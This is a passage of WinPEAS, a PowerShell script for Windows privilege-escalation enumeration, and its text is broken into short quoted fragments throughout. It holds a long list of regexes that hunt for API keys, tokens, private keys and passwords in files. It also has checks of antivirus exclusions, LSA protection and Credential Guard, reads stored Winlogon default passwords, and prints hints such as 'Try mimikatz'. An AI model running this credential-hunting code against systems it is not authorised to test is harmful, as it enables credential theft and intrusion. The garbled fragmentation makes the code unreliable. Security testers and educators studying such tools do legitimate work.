  $re','gexSearch.add("Lo','b Publishable API',' Key", "((test|li','ve)_pub_[a-f0-9]{','31})")
  $regexSe','arch.add("Mailbox','Validator", "(mai','lbox.?validator[a','-z0-9_ \.,\-]{0,2','5})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''"','"]([A-Z0-9]{20})[','''""]")
  $regexSe','arch.add("Mailchi','mp API Key", "[0-','9a-f]{32}-us[0-9]','{1,2}")
  $regexS','earch.add("Mailgu','n API Key", "key-','[0-9a-zA-Z]{32}''"',')
  $regexSearch.','add("Mailgun Publ','ic Validation Key','", "pubkey-[a-f0-','9]{32}")
  $regex','Search.add("Mailg','un Webhook signin','g key", "[a-h0-9]','{32}-[a-h0-9]{8}-','[a-h0-9]{8}")
  $','regexSearch.add("','Mapbox API Key", ','"(pk\.[a-z0-9]{60','}\.[a-z0-9]{22})"',')
  $regexSearch.','add("Mattermost A','ccess Token", "([','a-z0-9]{26})")
  ','$regexSearch.add(','"MessageBird API ','Key & API client ','ID", "(messagebir','d[a-z0-9_ \.,\-]{','0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}','[''""]([a-z0-9]{25','}|[a-h0-9]{8}-[a-','h0-9]{4}-[a-h0-9]','{4}-[a-h0-9]{4}-[','a-h0-9]{12})[''""]','")
  $regexSearch','.add("Microsoft T','eams Webhook", "h','ttps:\/\/[a-z0-9]','+\.webhook\.offic','e\.com\/webhookb2','\/[a-z0-9]{8}-([a','-z0-9]{4}-){3}[a-','z0-9]{12}@[a-z0-9',']{8}-([a-z0-9]{4}','-){3}[a-z0-9]{12}','\/IncomingWebhook','\/[a-z0-9]{32}\/[','a-z0-9]{8}-([a-z0','-9]{4}-){3}[a-z0-','9]{12}")
  $regex','Search.add("MojoA','uth API Key", "[a','-f0-9]{8}-[a-f0-9',']{4}-[a-f0-9]{4}-','[a-f0-9]{4}-[a-f0','-9]{12}")
  $rege','xSearch.add("Netl','ify Access Token"',', "([a-z0-9=_\-]{','40,46})")
  $rege','xSearch.add("New ','Relic User API Ke','y, User API ID & ','Ingest Browser AP','I Key", "(NRAK-[A','-Z0-9]{27})|((new','relic[a-z0-9_ \.,','\-]{0,25})(=|>|:=','|\|\|:|<=|=>|:).{','0,5}[''""]([A-Z0-9',']{64})[''""])|(NRJ','S-[a-f0-9]{19})")','
  $regexSearch.a','dd("Nownodes", "(','nownodes[a-z0-9_ ','\.,\-]{0,25})(=|>','|:=|\|\|:|<=|=>|:',').{0,5}[''""]([A-Z','a-z0-9]{32})[''""]','")
  $regexSearch','.add("Npm Access ','Token", "(npm_[a-','zA-Z0-9]{36})")
 ',' $regexSearch.add','("Nytimes Access ','Token", "([a-z0-9','=_\-]{32})")
  $r','egexSearch.add("O','kta Access Token"',', "([a-z0-9=_\-]{','42})")
  $regexSe','arch.add("OpenAI ','API Token", "sk-[','A-Za-z0-9]{48}")
','  $regexSearch.ad','d("ORB Intelligen','ce Access Key", "','[''""][a-f0-9]{8}-','[a-f0-9]{4}-[a-f0','-9]{4}-[a-f0-9]{4','}-[a-f0-9]{12}[''"','"]")
  $regexSear','ch.add("Pastebin ','API Key", "(paste','bin[a-z0-9_ \.,\-',']{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,','5}[''""]([a-z0-9]{','32})[''""]")
  $re','gexSearch.add("Pa','yPal Braintree Ac','cess Token", ''acc','ess_token\$produc','tion\$[0-9a-z]{16','}\$[0-9a-f]{32}'')','
  $regexSearch.a','dd("Picatic API K','ey", "sk_live_[0-','9a-z]{32}")
  $re','gexSearch.add("Pi','nata API Key", "(','pinata[a-z0-9_ \.',',\-]{0,25})(=|>|:','=|\|\|:|<=|=>|:).','{0,5}[''""]([a-z0-','9]{64})[''""]")
  ','$regexSearch.add(','"Planetscale API ','Key", "pscale_tkn','_[a-zA-Z0-9_\.\-]','{43}")
  $regexSe','arch.add("PlanetS','cale OAuth token"',', "(pscale_oauth_','[a-zA-Z0-9_\.\-]{','32,64})")
  $rege','xSearch.add("Plan','etscale Password"',', "pscale_pw_[a-z','A-Z0-9_\.\-]{43}"',')
  $regexSearch.','add("Plaid API To','ken", "(access-(?',':sandbox|developm','ent|production)-[','0-9a-f]{8}-[0-9a-','f]{4}-[0-9a-f]{4}','-[0-9a-f]{4}-[0-9','a-f]{12})")
  $re','gexSearch.add("Pl','aid Client ID", "','([a-z0-9]{24})")
','  $regexSearch.ad','d("Plaid Secret k','ey", "([a-z0-9]{3','0})")
  $regexSea','rch.add("Prefect ','API token", "(pnu','_[a-z0-9]{36})")
','  $regexSearch.ad','d("Postman API Ke','y", "PMAK-[a-fA-F','0-9]{24}-[a-fA-F0','-9]{34}")
  $rege','xSearch.add("Priv','ate Keys", "\-\-\','-\-\-BEGIN PRIVAT','E KEY\-\-\-\-\-|\','-\-\-\-\-BEGIN RS','A PRIVATE KEY\-\-','\-\-\-|\-\-\-\-\-','BEGIN OPENSSH PRI','VATE KEY\-\-\-\-\','-|\-\-\-\-\-BEGIN',' PGP PRIVATE KEY ','BLOCK\-\-\-\-\-|\','-\-\-\-\-BEGIN DS','A PRIVATE KEY\-\-','\-\-\-|\-\-\-\-\-','BEGIN EC PRIVATE ','KEY\-\-\-\-\-")
 ',' $regexSearch.add','("Pulumi API Key"',', "pul-[a-f0-9]{4','0}")
  $regexSear','ch.add("PyPI uplo','ad token", "pypi-','AgEIcHlwaS5vcmc[A','-Za-z0-9_\-]{50,}','")
  $regexSearch','.add("Quip API Ke','y", "(quip[a-z0-9','_ \.,\-]{0,25})(=','|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a','-zA-Z0-9]{15}=\|[','0-9]{10}\|[a-zA-Z','0-9\/+]{43}=)[''""',']")
  $regexSearc','h.add("RapidAPI A','ccess Token", "([','a-z0-9_-]{50})")
','  $regexSearch.ad','d("Rubygem API Ke','y", "rubygems_[a-','f0-9]{48}")
  $re','gexSearch.add("Re','adme API token", ','"rdme_[a-z0-9]{70','}")
  $regexSearc','h.add("Sendbird A','ccess ID", "([0-9','a-f]{8}-[0-9a-f]{','4}-[0-9a-f]{4}-[0','-9a-f]{4}-[0-9a-f',']{12})")
  $regex','Search.add("Sendb','ird Access Token"',', "([a-f0-9]{40})','")
  $regexSearch','.add("Sendgrid AP','I Key", "SG\.[a-z','A-Z0-9_\.\-]{66}"',')
  $regexSearch.','add("Sendinblue A','PI Key", "xkeysib','-[a-f0-9]{64}-[a-','zA-Z0-9]{16}")
  ','$regexSearch.add(','"Sentry Access To','ken", "([a-f0-9]{','64})")
  $regexSe','arch.add("Shippo ','API Key, Access T','oken, Custom Acce','ss Token, Private',' App Access Token',' & Shared Secret"',', "shippo_(live|t','est)_[a-f0-9]{40}','|shpat_[a-fA-F0-9',']{32}|shpca_[a-fA','-F0-9]{32}|shppa_','[a-fA-F0-9]{32}|s','hpss_[a-fA-F0-9]{','32}")
  $regexSea','rch.add("Sidekiq ','Secret", "([a-f0-','9]{8}:[a-f0-9]{8}',')")
  $regexSearc','h.add("Sidekiq Se','nsitive URL", "([','a-f0-9]{8}:[a-f0-','9]{8})@(?:gems.co','ntribsys.com|ente','rprise.contribsys','.com)")
  $regexS','earch.add("Slack ','Token", "xox[bapr','s]-([0-9a-zA-Z]{1','0,48})?")
  $rege','xSearch.add("Slac','k Webhook", "http','s://hooks.slack.c','om/services/T[a-z','A-Z0-9_]{10}/B[a-','zA-Z0-9_]{10}/[a-','zA-Z0-9_]{24}")
 ',' $regexSearch.add','("Smarksheel API ','Key", "(smartshee','t[a-z0-9_ \.,\-]{','0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}','[''""]([a-z0-9]{26','})[''""]")
  $rege','xSearch.add("Squa','re Access Token",',' "sqOatp-[0-9A-Za','-z_\-]{22}")
  $r','egexSearch.add("S','quare API Key", "','EAAAE[a-zA-Z0-9_-',']{59}")
  $regexS','earch.add("Square',' Oauth Secret", "','sq0csp-[ 0-9A-Za-','z_\-]{43}")
  $re','gexSearch.add("St','ytch API Key", "s','ecret-.*-[a-zA-Z0','-9_=\-]{36}")
  $','regexSearch.add("','Stripe Access Tok','en & API Key", "(','sk|pk)_(test|live',')_[0-9a-z]{10,32}','|k_live_[0-9a-zA-','Z]{24}")
  $regex','Search.add("SumoL','ogic Access ID", ','"([a-z0-9]{14})")','
  $regexSearch.a','dd("SumoLogic Acc','ess Token", "([a-','z0-9]{64})")
  $r','egexSearch.add("T','elegram Bot API T','oken", "[0-9]+:AA','[0-9A-Za-z\\-_]{3','3}")
  $regexSear','ch.add("Travis CI',' Access Token", "','([a-z0-9]{22})")
','  $regexSearch.ad','d("Trello API Key','", "(trello[a-z0-','9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=','>|:).{0,5}[''""]([','0-9a-z]{32})[''""]','")
  $regexSearch','.add("Twilio API ','Key", "SK[0-9a-fA','-F]{32}")
  $rege','xSearch.add("Twit','ch API Key", "(tw','itch[a-z0-9_ \.,\','-]{0,25})(=|>|:=|','\|\|:|<=|=>|:).{0',',5}[''""]([a-z0-9]','{30})[''""]")
  $r','egexSearch.add("T','witter Client ID"',', "[tT][wW][iI][t','T][tT][eE][rR](.{','0,20})?[''""][0-9a','-z]{18,25}")
  $r','egexSearch.add("T','witter Bearer Tok','en", "(A{22}[a-zA','-Z0-9%]{80,100})"',')
  $regexSearch.','add("Twitter Oaut','h", "[tT][wW][iI]','[tT][tT][eE][rR].','{0,30}[''""\\s][0-','9a-zA-Z]{35,44}[''','""\\s]")
  $regex','Search.add("Twitt','er Secret Key", "','[tT][wW][iI][tT][','tT][eE][rR](.{0,2','0})?[''""][0-9a-z]','{35,44}")
  $rege','xSearch.add("Type','form API Key", "t','fp_[a-z0-9_\.=\-]','{59}")
  $regexSe','arch.add("URLScan',' API Key", "[''""]','[a-f0-9]{8}-[a-f0','-9]{4}-[a-f0-9]{4','}-[a-f0-9]{4}-[a-','f0-9]{12}[''""]")
','  $regexSearch.ad','d("Vault Token", ','"[sb]\.[a-zA-Z0-9',']{24}")
  $regexS','earch.add("Yandex',' Access Token", "','(t1\.[A-Z0-9a-z_-',']+[=]{0,2}\.[A-Z0','-9a-z_-]{86}[=]{0',',2})")
  $regexSe','arch.add("Yandex ','API Key", "(AQVN[','A-Za-z0-9_\-]{35,','38})")
  $regexSe','arch.add("Yandex ','AWS Access Token"',', "(YC[a-zA-Z0-9_','\-]{38})")
  $reg','exSearch.add("Web','3 API Key", "(web','3[a-z0-9_ \.,\-]{','0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}','[''""]([A-Za-z0-9_','=\-]+\.[A-Za-z0-9','_=\-]+\.?[A-Za-z0','-9_.+/=\-]*)[''""]','")
  $regexSearch','.add("Zendesk Sec','ret Key", "([a-z0','-9]{40})")
  $reg','exSearch.add("Gen','eric API Key", "(','(key|api|token|se','cret|password)[a-','z0-9_ \.,\-]{0,25','})(=|>|:=|\|\|:|<','=|=>|:).{0,5}[''""',']([0-9a-zA-Z_=\-]','{8,64})[''""]")
}
','
if ($webAuth) {
','  $regexSearch.ad','d("Authorization ','Basic", "basic [a','-zA-Z0-9_:\.=\-]+','")
  $regexSearch','.add("Authorizati','on Bearer", "bear','er [a-zA-Z0-9_\.=','\-]+")
  $regexSe','arch.add("Alibaba',' Access Key ID", ','"(LTAI)[a-z0-9]{2','0}")
  $regexSear','ch.add("Alibaba S','ecret Key", "(ali','baba[a-z0-9_ \.,\','-]{0,25})(=|>|:=|','\|\|:|<=|=>|:).{0',',5}[''""]([a-z0-9]','{30})[''""]")
  $r','egexSearch.add("A','sana Client ID", ','"((asana[a-z0-9_ ','\.,\-]{0,25})(=|>','|:=|\|\|:|<=|=>|:',').{0,5}[''""]([0-9',']{16})[''""])|((as','ana[a-z0-9_ \.,\-',']{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,','5}[''""]([a-z0-9]{','32})[''""])")
  $r','egexSearch.add("A','WS Client ID", "(','A3T[A-Z0-9]|AKIA|','AGPA|AIDA|AROA|AI','PA|ANPA|ANVA|ASIA',')[A-Z0-9]{16}")
 ',' $regexSearch.add','("AWS MWS Key", "','amzn\.mws\.[0-9a-','f]{8}-[0-9a-f]{4}','-[0-9a-f]{4}-[0-9','a-f]{4}-[0-9a-f]{','12}")
  $regexSea','rch.add("AWS Secr','et Key", "aws(.{0',',20})?[''""][0-9a-','zA-Z\/+]{40}[''""]','")
  $regexSearch','.add("AWS AppSync',' GraphQL Key", "d','a2-[a-z0-9]{26}")','
  $regexSearch.a','dd("Basic Auth Cr','edentials", "://[','a-zA-Z0-9]+:[a-zA','-Z0-9]+@[a-zA-Z0-','9]+\.[a-zA-Z]+")
','  $regexSearch.ad','d("Beamer Client ','Secret", "(beamer','[a-z0-9_ \.,\-]{0',',25})(=|>|:=|\|\|',':|<=|=>|:).{0,5}[','''""](b_[a-z0-9=_\','-]{44})[''""]")
  ','$regexSearch.add(','"Cloudinary Basic',' Auth", "cloudina','ry://[0-9]{15}:[0','-9A-Za-z]+@[a-z]+','")
  $regexSearch','.add("Facebook Cl','ient ID", "([fF][','aA][cC][eE][bB][o','O][oO][kK]|[fF][b','B])(.{0,20})?[''""','][0-9]{13,17}")
 ',' $regexSearch.add','("Facebook Oauth"',', "[fF][aA][cC][e','E][bB][oO][oO][kK','].*[''|""][0-9a-f]','{32}[''|""]")
  $r','egexSearch.add("F','acebook Secret Ke','y", "([fF][aA][cC','][eE][bB][oO][oO]','[kK]|[fF][bB])(.{','0,20})?[''""][0-9a','-f]{32}")
  $rege','xSearch.add("Jenk','ins Creds", "<[a-','zA-Z]*>{[a-zA-Z0-','9=+/]*}<")
  $reg','exSearch.add("Gen','eric Secret", "[s','S][eE][cC][rR][eE','][tT].*[''""][0-9a','-zA-Z]{32,45}[''""',']")
  $regexSearc','h.add("Basic Auth','", "//(.+):(.+)@"',')
  $regexSearch.','add("PHP Password','s", "(pwd|passwd|','password|PASSWD|P','ASSWORD|dbuser|db','pass|pass'').*[=:]','.+|define ?\(''(\w','*pass|\w*pwd|\w*u','ser|\w*datab)")
 ',' $regexSearch.add','("Config Secrets ','(Passwd / Credent','ials)", "passwd.*','|creden.*|^kind:[','^a-zA-Z0-9_]?Secr','et|[^a-zA-Z0-9_]e','nv:|secret:|secre','tName:|^kind:[^a-','zA-Z0-9_]?Encrypt','ionConfiguration|','\-\-encryption\-p','rovider\-config")','
  $regexSearch.a','dd("Generiac API ','tokens search", "','(access_key|acces','s_token|admin_pas','s|admin_user|algo','lia_admin_key|alg','olia_api_key|alia','s_pass|alicloud_a','ccess_key| amazon','_secret_access_ke','y|amazonaws|ansib','le_vault_password','|aos_key|api_key|','api_key_secret|ap','i_key_sid|api_sec','ret| api.googlema','ps AIza|apidocs|a','pikey|apiSecret|a','pp_debug|app_id|a','pp_key|app_log_le','vel|app_secret|ap','pkey|appkeysecret','| application_key','|appsecret|appspo','t|auth_token|auth','orizationToken|au','thsecret|aws_acce','ss|aws_access_key','_id|aws_bucket| a','ws_key|aws_secret','|aws_secret_key|a','ws_token|AWSSecre','tKey|b2_app_key|b','ashrc password| b','intray_apikey|bin','tray_gpg_password','|bintray_key|bint','raykey|bluemix_ap','i_key|bluemix_pas','s|browserstack_ac','cess_key| bucket_','password|bucketee','r_aws_access_key_','id|bucketeer_aws_','secret_access_key','|built_branch_dep','loy_key|bx_passwo','rd|cache_driver| ','cache_s3_secret_k','ey|cattle_access_','key|cattle_secret','_key|certificate_','password|ci_deplo','y_password|client','_secret| client_z','pk_secret_key|clo','jars_password|clo','ud_api_key|cloud_','watch_aws_access_','key|cloudant_pass','word| cloudflare_','api_key|cloudflar','e_auth_key|cloudi','nary_api_secret|c','loudinary_name|co','decov_token|conn.','login| connection','string|consumer_k','ey|consumer_secre','t|credentials|cyp','ress_record_key|d','atabase_password|','database_schema_t','est| datadog_api_','key|datadog_app_k','ey|db_password|db','_server|db_userna','me|dbpasswd|dbpas','sword|dbuser|depl','oy_password| digi','talocean_ssh_key_','body|digitalocean','_ssh_key_ids|dock','er_hub_password|d','ocker_key|docker_','pass|docker_passw','d| docker_passwor','d|dockerhub_passw','ord|dockerhubpass','word|dot-files|do','tfiles|droplet_tr','avis_password|dyn','amoaccesskeyid| d','ynamosecretaccess','key|elastica_host','|elastica_port|el','asticsearch_passw','ord|encryption_ke','y|encryption_pass','word| env.heroku_','api_key|env.sonat','ype_password|eure','ka.awssecretkey)[','a-z0-9_ .,<\-]{0,','25}(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''"','"]([0-9a-zA-Z_=\-',']{8,64})[''""]")
}','

if($FullCheck){','$Excel = $true}

','$regexSearch.add(','"IPs", "(25[0-5]|','2[0-4][0-9]|[01]?','[0-9][0-9]?)\.(25','[0-5]|2[0-4][0-9]','|[01]?[0-9][0-9]?',')\.(25[0-5]|2[0-4','][0-9]|[01]?[0-9]','[0-9]?)\.(25[0-5]','|2[0-4][0-9]|[01]','?[0-9][0-9]?)")
$','Drives = Get-PSDr','ive | Where-Objec','t { $_.Root -like',' "*:\" }
$fileExt','ensions = @("*.xm','l", "*.txt", "*.c','onf", "*.config",',' "*.cfg", "*.ini"',', ".y*ml", "*.log','", "*.bak", "*.xl','s", "*.xlsx", "*.','xlsm")


########','################ ','INTRODUCTION ####','#################','###
$stopwatch = ','[system.diagnosti','cs.stopwatch]::St','artNew()

if ($Fu','llCheck) {
  Writ','e-Host "**Full Ch','eck Enabled. This',' will significant','ly increase false',' positives in reg','istry / folder ch','eck for Usernames',' / Passwords.**"
','}
# Introduction ','   
Write-Host -B','ackgroundColor Re','d -ForegroundColo','r White "ADVISORY',': WinPEAS - Windo','ws local Privileg','e Escalation Awes','ome Script"
Write','-Host -Background','Color Red -Foregr','oundColor White "','WinPEAS should be',' used for authori','zed penetration t','esting and/or edu','cational purposes',' only"
Write-Host',' -BackgroundColor',' Red -ForegroundC','olor White "Any m','isuse of this sof','tware will not be',' the responsibili','ty of the author ','or of any other c','ollaborator"
Writ','e-Host -Backgroun','dColor Red -Foreg','roundColor White ','"Use it at your o','wn networks and/o','r with the networ','k owner''s explici','t permission"


#',' Color Scheme Int','roduction
Write-H','ost -ForegroundCo','lor red    "Indic','ates special priv','ilege over an obj','ect or misconfigu','ration"
Write-Hos','t -ForegroundColo','r green  "Indicat','es protection is ','enabled or someth','ing is well confi','gured"
Write-Host',' -ForegroundColor',' cyan   "Indicate','s active users"
W','rite-Host -Foregr','oundColor Gray   ','"Indicates disabl','ed users"
Write-H','ost -ForegroundCo','lor yellow "Indic','ates links"
Write','-Host -Foreground','Color Blue   "Ind','icates title"


W','rite-Host "You ca','n find a Windows ','local PE Checklis','t here: https://b','ook.hacktricks.wi','ki/en/windows-har','dening/checklist-','windows-privilege','-escalation.html"',' -ForegroundColor',' Yellow
#write-ho','st  "Creating Dyn','amic lists, this ','could take a whil','e, please wait...','"
#write-host  "L','oading sensitive_','files yaml defini','tions file..."
#w','rite-host  "Loadi','ng regexes yaml d','efinitions file..','."


############','############ SYST','EM INFORMATION ##','#################','#####

Write-Host',' ""
if ($TimeStam','p) { TimeElapsed ','}
Write-Host "===','=================','================|','|SYSTEM INFORMATI','ON ||============','=================','======="
"The fol','lowing informatio','n is curated. To ','get a full list o','f system informat','ion, run the cmdl','et get-computerin','fo"

#System Info',' from get-compute','r info
systeminfo','.exe


#Hotfixes ','installed sorted ','by date
Write-Hos','t ""
if ($TimeSta','mp) { TimeElapsed',' }
Write-Host -Fo','regroundColor Blu','e "=========|| WI','NDOWS HOTFIXES"
W','rite-Host "=| Che','ck if windows is ','vulnerable with W','atson https://git','hub.com/rasta-mou','se/Watson" -Foreg','roundColor Yellow','
Write-Host "Poss','ible exploits (ht','tps://github.com/','codingo/OSCP-2/bl','ob/master/Windows','/WinPrivCheck.bat',')" -ForegroundCol','or Yellow
$Hotfix',' = Get-HotFix | S','ort-Object -Desce','nding -Property I','nstalledOn -Error','Action SilentlyCo','ntinue | Select-O','bject HotfixID, D','escription, Insta','lledBy, Installed','On
$Hotfix | Form','at-Table -AutoSiz','e


#Show all uni','que updates insta','lled
Write-Host "','"
if ($TimeStamp)',' { TimeElapsed }
','Write-Host -Foreg','roundColor Blue "','=========|| ALL U','PDATES INSTALLED"','


# 0, and 5 are',' not used for his','tory
# See https:','//msdn.microsoft.','com/en-us/library','/windows/desktop/','aa387095(v=vs.85)','.aspx
# Source: h','ttps://stackoverf','low.com/questions','/41626129/how-do-','i-get-the-update-','history-from-wind','ows-update-in-pow','ershell?utm_mediu','m=organic&utm_sou','rce=google_rich_q','a&utm_campaign=go','ogle_rich_qa

$se','ssion = (New-Obje','ct -ComObject ''Mi','crosoft.Update.Se','ssion'')
# Query t','he latest 50 upda','tes starting with',' the first record','
$history = $sess','ion.QueryHistory(','"", 0, 1000) | Se','lect-Object Resul','tCode, Date, Titl','e

#create an arr','ay for unique Hot','Fixes
$HotfixUniq','ue = @()
#$Hotfix','Unique += ($histo','ry[0].title | Sel','ect-String -AllMa','tches -Pattern ''K','B(\d{4,6})'').Matc','hes.Value

$HotFi','xReturnNum = @()
','#$HotFixReturnNum',' += 0 

for ($i =',' 0; $i -lt $histo','ry.Count; $i++) {','
  $check = retur','nHotFixID -title ','$history[$i].Titl','e
  if ($HotfixUn','ique -like $check',') {
    #Do Nothi','ng
  }
  else {
 ','   $HotfixUnique ','+= $check
    $Ho','tFixReturnNum += ','$i
  }
}
$FinalHo','tfixList = @()

$','hotfixreturnNum |',' ForEach-Object {','
  $HotFixItem = ','$history[$_]
  $R','esult = $HotFixIt','em.ResultCode
  #',' https://learn.mi','crosoft.com/en-us','/windows/win32/ap','i/wuapi/ne-wuapi-','operationresultco','de?redirectedfrom','=MSDN
  switch ($','Result) {
    1 {','
      $Result = ','"Missing/Supersed','ed"
    }
    2 {','
      $Result = ','"Succeeded"
    }','
    3 {
      $R','esult = "Succeede','d With Errors"
  ','  }
    4 {
     ',' $Result = "Faile','d"
    }
    5 {
','      $Result = "','Canceled"
    }
 ',' }
  $FinalHotfix','List += New-Objec','t -TypeName PSObj','ect -Property ([O','rdered]@{ 
    Re','sult = $Result
  ','  Date   = $HotFi','xItem.Date
    Ti','tle  = $HotFixIte','m.Title
  })
}
$F','inalHotfixList | ','Format-Table -Aut','oSize


Write-Hos','t ""
if ($TimeSta','mp) { TimeElapsed',' }
Write-Host -Fo','regroundColor Blu','e "=========|| Dr','ive Info"
# Load ','the System.Manage','ment assembly
Add','-Type -AssemblyNa','me System.Managem','ent

# Create a M','anagementObjectSe','archer to query W','in32_LogicalDisk
','$diskSearcher = N','ew-Object System.','Management.Manage','mentObjectSearche','r("SELECT * FROM ','Win32_LogicalDisk',' WHERE DriveType ','= 3")

# Get the ','system drives
$sy','stemDrives = $dis','kSearcher.Get()

','# Loop through ea','ch drive and disp','lay its informati','on
foreach ($driv','e in $systemDrive','s) {
  $driveLett','er = $drive.Devic','eID
  $driveLabel',' = $drive.VolumeN','ame
  $driveSize ','= [math]::Round($','drive.Size / 1GB,',' 2)
  $driveFreeS','pace = [math]::Ro','und($drive.FreeSp','ace / 1GB, 2)

  ','Write-Output "Dri','ve: $driveLetter"','
  Write-Output "','Label: $driveLabe','l"
  Write-Output',' "Size: $driveSiz','e GB"
  Write-Out','put "Free Space: ','$driveFreeSpace G','B"
  Write-Output',' ""
}


Write-Hos','t ""
if ($TimeSta','mp) { TimeElapsed',' }
Write-Host -Fo','regroundColor Blu','e "=========|| An','tivirus Detection',' (attemping to re','ad exclusions as ','well)"
WMIC /Node',':localhost /Names','pace:\\root\Secur','ityCenter2 Path A','ntiVirusProduct G','et displayName
Ge','t-ChildItem ''regi','stry::HKLM\SOFTWA','RE\Microsoft\Wind','ows Defender\Excl','usions'' -ErrorAct','ion SilentlyConti','nue


Write-Host ','""
if ($TimeStamp',') { TimeElapsed }','
Write-Host -Fore','groundColor Blue ','"=========|| NET ','ACCOUNTS Info"
ne','t accounts

#####','#################','## REGISTRY SETTI','NG CHECK ########','################
','Write-Host ""
if ','($TimeStamp) { Ti','meElapsed }
Write','-Host -Foreground','Color Blue "=====','====|| REGISTRY S','ETTINGS CHECK"

 ','
Write-Host ""
if',' ($TimeStamp) { T','imeElapsed }
Writ','e-Host -Foregroun','dColor Blue "====','=====|| Audit Log',' Settings"
#Check',' audit registry
i','f ((Test-Path HKL','M:\SOFTWARE\Micro','soft\Windows\Curr','entVersion\Polici','es\System\Audit\)','.Property) {
  Ge','t-Item -Path HKLM',':\SOFTWARE\Micros','oft\Windows\Curre','ntVersion\Policie','s\System\Audit\
}','
else {
  Write-H','ost "No Audit Log',' settings, no reg','istry entry found','."
}

 
Write-Hos','t ""
if ($TimeSta','mp) { TimeElapsed',' }
Write-Host -Fo','regroundColor Blu','e "=========|| Wi','ndows Event Forwa','rd (WEF) registry','"
if (Test-Path H','KLM:\SOFTWARE\Pol','icies\Microsoft\W','indows\EventLog\E','ventForwarding\Su','bscriptionManager',') {
  Get-Item HK','LM:\SOFTWARE\Poli','cies\Microsoft\Wi','ndows\EventLog\Ev','entForwarding\Sub','scriptionManager
','}
else {
  Write-','Host "Logs are no','t being fowarded,',' no registry entr','y found."
}

 
Wr','ite-Host ""
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| LAPS Check"
','if (Test-Path ''C:','\Program Files\LA','PS\CSE\Admpwd.dll',''') { Write-Host "','LAPS dll found on',' this machine at ','C:\Program Files\','LAPS\CSE\" -Foreg','roundColor Green ','}
elseif (Test-Pa','th ''C:\Program Fi','les (x86)\LAPS\CS','E\Admpwd.dll'' ) {',' Write-Host "LAPS',' dll found on thi','s machine at C:\P','rogram Files (x86',')\LAPS\CSE\" -For','egroundColor Gree','n }
else { Write-','Host "LAPS dlls n','ot found on this ','machine" }
if ((G','et-ItemProperty H','KLM:\Software\Pol','icies\Microsoft S','ervices\AdmPwd -E','rrorAction Silent','lyContinue).AdmPw','dEnabled -eq 1) {',' Write-Host "LAPS',' registry key fou','nd on this machin','e" -ForegroundCol','or Green }


Writ','e-Host ""
if ($Ti','meStamp) { TimeEl','apsed }
Write-Hos','t -ForegroundColo','r Blue "=========','|| WDigest Check"','
$WDigest = (Get-','ItemProperty HKLM',':\SYSTEM\CurrentC','ontrolSet\Control','\SecurityProvider','s\WDigest).UseLog','onCredential
swit','ch ($WDigest) {
 ',' 0 { Write-Host "','Value 0 found. Pl','ain-text Password','s are not stored ','in LSASS" }
  1 {',' Write-Host "Valu','e 1 found. Plain-','text Passwords ma','y be stored in LS','ASS" -ForegroundC','olor red }
  Defa','ult { Write-Host ','"The system was u','nable to find the',' specified regist','ry value: UseLogo','nCredential" }
}
','
 
Write-Host ""
','if ($TimeStamp) {',' TimeElapsed }
Wr','ite-Host -Foregro','undColor Blue "==','=======|| LSA Pro','tection Check"
$R','unAsPPL = (Get-It','emProperty HKLM:\','SYSTEM\CurrentCon','trolSet\Control\L','SA).RunAsPPL
$Run','AsPPLBoot = (Get-','ItemProperty HKLM',':\SYSTEM\CurrentC','ontrolSet\Control','\LSA).RunAsPPLBoo','t
switch ($RunAsP','PL) {
  2 { Write','-Host "RunAsPPL: ','2. Enabled withou','t UEFI Lock" }
  ','1 { Write-Host "R','unAsPPL: 1. Enabl','ed with UEFI Lock','" }
  0 { Write-H','ost "RunAsPPL: 0.',' LSA Protection D','isabled. Try mimi','katz." -Foregroun','dColor red }
  De','fault { "The syst','em was unable to ','find the specifie','d registry value:',' RunAsPPL / RunAs','PPLBoot" }
}
if (','$RunAsPPLBoot) { ','Write-Host "RunAs','PPLBoot: $RunAsPP','LBoot" }

 
Write','-Host ""
if ($Tim','eStamp) { TimeEla','psed }
Write-Host',' -ForegroundColor',' Blue "=========|','| Credential Guar','d Check"
$LsaCfgF','lags = (Get-ItemP','roperty HKLM:\SYS','TEM\CurrentContro','lSet\Control\LSA)','.LsaCfgFlags
swit','ch ($LsaCfgFlags)',' {
  2 { Write-Ho','st "LsaCfgFlags 2','. Enabled without',' UEFI Lock" }
  1',' { Write-Host "Ls','aCfgFlags 1. Enab','led with UEFI Loc','k" }
  0 { Write-','Host "LsaCfgFlags',' 0. LsaCfgFlags D','isabled." -Foregr','oundColor red }
 ',' Default { "The s','ystem was unable ','to find the speci','fied registry val','ue: LsaCfgFlags" ','}
}

 
Write-Host',' ""
if ($TimeStam','p) { TimeElapsed ','}
Write-Host -For','egroundColor Blue',' "=========|| Cac','hed WinLogon Cred','entials Check"
if',' (Test-Path "HKLM',':\SOFTWARE\Micros','oft\Windows NT\Cu','rrentVersion\Winl','ogon") {
  (Get-I','temProperty "HKLM',':\SOFTWARE\Micros','oft\Windows NT\Cu','rrentVersion\Winl','ogon" -Name "CACH','EDLOGONSCOUNT").C','ACHEDLOGONSCOUNT
','  Write-Host "How','ever, only the SY','STEM user can vie','w the credentials',' here: HKEY_LOCAL','_MACHINE\SECURITY','\Cache"
  Write-H','ost "Or, using mi','mikatz lsadump::c','ache"
}

Write-Ho','st ""
if ($TimeSt','amp) { TimeElapse','d }
Write-Host -F','oregroundColor Bl','ue "=========|| A','dditonal Winlogon',' Credentials Chec','k"

(Get-ItemProp','erty "HKLM:\SOFTW','ARE\Microsoft\Win','dows NT\CurrentVe','rsion\Winlogon").','DefaultDomainName','
(Get-ItemPropert','y "HKLM:\SOFTWARE','\Microsoft\Window','s NT\CurrentVersi','on\Winlogon").Def','aultUserName
(Get','-ItemProperty "HK','LM:\SOFTWARE\Micr','osoft\Windows NT\','CurrentVersion\Wi','nlogon").DefaultP','assword
(Get-Item','Property "HKLM:\S','OFTWARE\Microsoft','\Windows NT\Curre','ntVersion\Winlogo','n").AltDefaultDom','ainName
